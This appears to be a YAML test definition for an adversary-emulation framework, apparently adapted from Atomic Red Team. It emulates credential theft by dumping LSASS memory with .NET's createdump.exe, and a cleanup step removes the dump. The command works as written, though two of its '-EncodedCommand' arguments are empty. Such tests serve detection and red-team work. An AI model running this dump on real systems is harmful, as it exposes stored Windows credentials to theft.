- requirements: []
  name: Soumaia ART Tests - Dump LSASS with createdump.exe from .Net v5
  description: 'Use createdump executable from .NET to create an LSASS dump.


    [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20) (requires elevation)'
  tactic: credential-access
  technique_id: T1003.001
  technique_name: 'OS Credential Dumping: LSASS Memory'
  executors:
  - cleanup:
    - Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: powershell -NoProfile -EncodedCommand ; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"; & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
  id: 52209b97-ed37-5de6-be18-a8f015dce78a
